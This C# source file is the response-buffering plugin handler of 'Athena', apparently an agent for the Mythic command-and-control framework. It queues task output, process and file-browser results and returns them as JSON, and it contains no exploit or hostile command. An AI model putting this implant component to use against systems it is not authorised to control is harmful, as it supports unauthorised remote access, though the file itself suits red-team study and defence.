﻿using Athena.Models;
using Athena.Models.Mythic.Tasks;
using System.Collections.Concurrent;

namespace Athena.Plugins
{
    public class PluginHandler
    {
        private static ConcurrentDictionary<string, ResponseResult> responseResults = new ConcurrentDictionary<string, ResponseResult>();
        private static ConcurrentDictionary<string, ProcessResponseResult> processResults = new ConcurrentDictionary<string, ProcessResponseResult>();
        private static ConcurrentDictionary<string, FileBrowserResponseResult> fileBrowserResults = new ConcurrentDictionary<string, FileBrowserResponseResult>();
        public static ConcurrentDictionary<string, MythicJob> activeJobs = new ConcurrentDictionary<string, MythicJob>();

        public static void AddResponse(ResponseResult res)
        {
            Console.WriteLine($"Adding Response for task: {res.task_id}");
            if (responseResults.ContainsKey(res.task_id))
            {
                ResponseResult newResponse = (ResponseResult)responseResults[res.task_id];
                if (!string.IsNullOrEmpty(res.completed))
                {
                    newResponse.completed = res.completed;
                }

                if (!string.IsNullOrEmpty(res.status))
                {
                    newResponse.status = res.status;
                }
            }
            else
            {
                responseResults.TryAdd(res.task_id, res);
            }
        }

        public static void AddResponse(FileBrowserResponseResult res)
        {
            if (fileBrowserResults.ContainsKey(res.task_id))
            {
                FileBrowserResponseResult newResponse = (FileBrowserResponseResult)fileBrowserResults[res.task_id];
                if (!string.IsNullOrEmpty(res.completed))
                {
                    newResponse.completed = res.completed;
                }

                if (!string.IsNullOrEmpty(res.status))
                {
                    newResponse.status = res.status;
                }
            }
            else
            {
                fileBrowserResults.TryAdd(res.task_id, res);
            }
        }

        public static void AddResponse(ProcessResponseResult res)
        {
            if (processResults.ContainsKey(res.task_id))
            {
                ProcessResponseResult newResponse = (ProcessResponseResult)processResults[res.task_id];
                if (!string.IsNullOrEmpty(res.completed))
                {
                    newResponse.completed = res.completed;
                }

                if (!string.IsNullOrEmpty(res.status))
                {
                    newResponse.status = res.status;
                }
            }
            else
            {
                processResults.TryAdd(res.task_id, res);
            }
        }

        public static void Write(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(task_id, new ResponseResult { user_output = output, completed = completed.ToString(), status = status, task_id = task_id }, (k, t) =>
            {
                ResponseResult newResponse = t;
                newResponse.user_output += output;
                if (completed)
                {
                    newResponse.completed = "true";
                }
                if (!string.IsNullOrEmpty(status))
                {
                    newResponse.status = status;
                }
                return newResponse;
            });
            Console.WriteLine($"[Write] {responseResults.Count}");
            Console.WriteLine(output);
        }
        public static void WriteLine(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(task_id, new ResponseResult { user_output = output + Environment.NewLine, completed = completed.ToString(), status = status, task_id = task_id }, (k, t) =>
            {
                var newResponse = (ResponseResult)t;
                newResponse.user_output += output + Environment.NewLine;
                if (completed)
                {
                    newResponse.completed = "true";
                }
                if (!string.IsNullOrEmpty(status))
                {
                    newResponse.status = status;
                }
                return newResponse;
            });
            Console.WriteLine($"[WriteLine] {responseResults.Count}");
            Console.WriteLine(output);
        }
        public static void WriteLine(string? output, string task_id, bool completed)
        {
            WriteLine(output, task_id, completed, "");
        }

        public static void Write(string? output, string task_id, bool completed)
        {
            Write(output, task_id, completed, "");
        }

        public static async Task<List<string>> GetResponses()
        {
            List<string> results = new List<string>();
            Console.WriteLine($"Total Responses: {responseResults.Count + processResults.Count + fileBrowserResults.Count}");
            foreach(ResponseResult response in responseResults.Values)
            {
                if (response.completed == "true")
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                results.Add(response.ToJson());
            }
            foreach (ProcessResponseResult response in processResults.Values)
            {
                if (response.completed == "true")
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                results.Add(response.ToJson());
            }
            foreach (FileBrowserResponseResult response in fileBrowserResults.Values)
            {
                if (response.completed == "true")
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                results.Add(response.ToJson());
            }

            fileBrowserResults.Clear();
            responseResults.Clear();
            processResults.Clear();
            Console.WriteLine("Really Returning: " + results.Count + " results.");
            return results;
        }
    }
}